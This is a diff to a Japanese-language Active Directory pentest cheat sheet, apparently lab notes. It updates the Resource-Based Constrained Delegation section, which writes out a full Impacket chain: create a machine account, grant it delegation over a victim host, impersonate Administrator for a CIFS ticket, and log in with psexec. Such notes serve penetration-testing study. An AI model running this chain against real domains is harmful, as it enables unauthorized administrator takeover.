@@ -348,20 +348,20 @@ $ wmiexec.py THM.CORP/Administrator@HAYSTACK.THM.CORP -k -no-pass
 
 ## Resource-Based Constrained Delegation (RBCD)
 
-あるユーザーがマシンアカウントに対してGenericWriteを持つ場合。
+あるユーザーがマシンアカウントに対して GenericWrite や AddAllowedToAct を持つ場合。
 
 ```sh
 # 例: 攻撃用コンピュータ 'ATTACKVM$' を作成
-addcomputer.py -method SAMR -dc-ip <DC-IP> -computer-name 'ATTACKVM' -computer-pass 'Password123!' 'domain/user:password'
+addcomputer.py -method SAMR -dc-ip <DC-IP> -computer-name 'ATTACKVM' -computer-pass 'Password123!' 'domain.local/user:password'
 
 # ATTACKVM の権限を VICTIM-PC に付与
-rbcd.py -action write -delegate-from 'ATTACKVM$' -delegate-to 'VICTIM-PC$' -dc-ip <DC-IP> 'domain/user:password'
+rbcd.py -action write -delegate-from 'ATTACKVM$' -delegate-to 'VICTIM-PC$' -dc-ip <DC-IP> 'domain.local/user:password'
 
 # Administrator として CIFS サービスのチケットを取得
 # /etc/hosts に追加していないとエラーが出る。エラーの内容をよく見ること。
-getST.py -spn 'cifs/VICTIM-PC.domain.local' -impersonate 'Administrator' 'domain/ATTACKVM$:Password123!'
+getST.py -spn 'cifs/VICTIM-PC.domain.local' -impersonate 'Administrator' 'domain.local/ATTACKVM$:Password123!'
 
 # チケットを使用してログイン
 export KRB5CCNAME=Administrator.ccache
-psexec.py -k -no-pass 'domain/Administrator@VICTIM-PC.domain.local'
+psexec.py -k -no-pass 'domain.local/Administrator@VICTIM-PC.domain.local'
 ```
